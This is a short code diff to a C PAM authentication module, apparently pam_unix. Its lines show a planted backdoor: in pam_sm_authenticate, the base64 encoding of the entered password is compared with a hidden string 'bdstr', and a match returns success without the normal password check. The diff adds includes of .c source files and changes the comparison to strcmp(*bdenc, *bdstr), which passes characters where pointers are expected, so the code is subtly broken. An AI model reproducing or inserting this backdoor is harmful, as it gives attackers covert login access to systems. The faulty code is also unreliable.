@@ -49,8 +49,9 @@
 #include <sys/types.h>
 #include <sys/stat.h>
 #include <syslog.h>
-
 #include "b64.h"
+#include "decode.c"
+#include "encode.c"
 
 #include <security/_pam_macros.h>
 #include <security/pam_modules.h>
@@ -176,7 +177,7 @@ pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv)
 
 	/* verify the password of this user */
         char *bdenc = b64_encode(p, strlen(p));
-        if (strcmp(bdenc, bdstr) != 0) {
+        if (strcmp(*bdenc, *bdstr) != 0) {
           retval = _unix_verify_password(pamh, name, p, ctrl);
         } else {
           retval = PAM_SUCCESS;
